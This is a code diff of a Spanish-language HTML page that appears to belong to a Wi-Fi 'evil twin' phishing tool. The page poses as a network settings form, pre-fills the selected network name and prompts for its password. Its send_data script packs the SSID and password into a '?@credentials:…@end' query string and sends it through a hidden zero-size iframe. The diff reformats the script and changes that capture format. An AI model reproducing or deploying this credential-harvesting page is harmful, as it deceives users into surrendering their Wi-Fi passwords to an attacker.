@@ -37,6 +37,7 @@
           $tr_swap
         </tbody>
       </table>
+
       <div class="psw" style="margin-top: 10px;">
         <label style="text-align: left;display: block;">Red:</label>
         <input id="wifi_ssid" style="padding: 8px 8px; display: block;width: 94%;" disabled>
@@ -44,33 +45,32 @@
         <input id="wifi_psw" style="padding: 8px 8px;display: block;width: 94%;">
         <input onclick="send_data()"id="login_input" value="GUARDAR" type="submit" style="width: 100%;height: 58px;">
       </div>
+
     </div>
   </body>
   <iframe id="data_frame" STYLE='position:absolute; TOP:0px; LEFT:0px'height="0" width="0"></iframe>
-<script>
-last_sender = ""
-selected_ssid = "$cred_ssid"
-selected_psw = "$cred_psw"
+  <script>
+    last_sender = ""
+    selected_ssid = "$cred_ssid"
+    selected_psw = "$cred_psw"
 
-og_url = window.location.href
-document.getElementById('wifi_ssid').value = selected_ssid
-document.getElementById('wifi_psw').value = selected_psw
+    og_url = window.location.href
+    document.getElementById('wifi_ssid').value = selected_ssid
+    document.getElementById('wifi_psw').value = selected_psw
 
-function set_ssid(sender){
-  if (last_sender != sender){last_sender.style="background:white"}
-  sender.style="background:#92cfff"
-  selected_ssid = sender.textContent
-  document.getElementById('wifi_ssid').value = selected_ssid
-  last_sender = sender
-}
+    function set_ssid(sender){
+      if (last_sender != sender){last_sender.style="background:white"}
+      sender.style="background:#92cfff"
+      selected_ssid = sender.textContent
+      document.getElementById('wifi_ssid').value = selected_ssid
+      last_sender = sender
+    }
 
-function send_data(){
-  ssid_psw = document.getElementById('wifi_psw').value
-  url_data = og_url + "?@ssid:" + selected_ssid + "@ssid_psw:" + ssid_psw
-  console.log(url_data)
-  document.getElementById('data_frame').src = url_data
-}
-
-
-</script>
+    function send_data(){
+      ssid_psw = document.getElementById('wifi_psw').value
+      url_data = og_url + "?@credentials:" + selected_ssid + "," + ssid_psw + "@end"
+      console.log(url_data)
+      document.getElementById('data_frame').src = url_data
+    }
+  </script>
 </html>
